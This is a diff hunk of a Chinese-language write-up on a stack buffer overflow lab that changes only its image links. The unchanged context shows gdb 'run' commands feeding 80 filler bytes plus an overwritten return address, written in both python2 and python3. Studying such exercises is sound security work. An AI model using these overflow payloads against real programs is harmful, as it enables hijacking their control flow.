@@ -121,11 +121,11 @@ Program received signal SIGSEGV, Segmentation fault.
 # python2写法
 run $(python2 -c 'print "A"*80 + "\x64\x84\x04\x08"')
 ```
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250912195356183.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250912195356183.png)
 
 ```c
 # python3写法
 #　python3不可以直接使用ｐｒint函数（默认会在结尾添加一个”\n“）
 run $(python -c 'import sys; sys.stdout.buffer.write(b"A"*80 + b"\x64\x84\x04\x08")')
 ```
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250912195541212.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250912195541212.png)
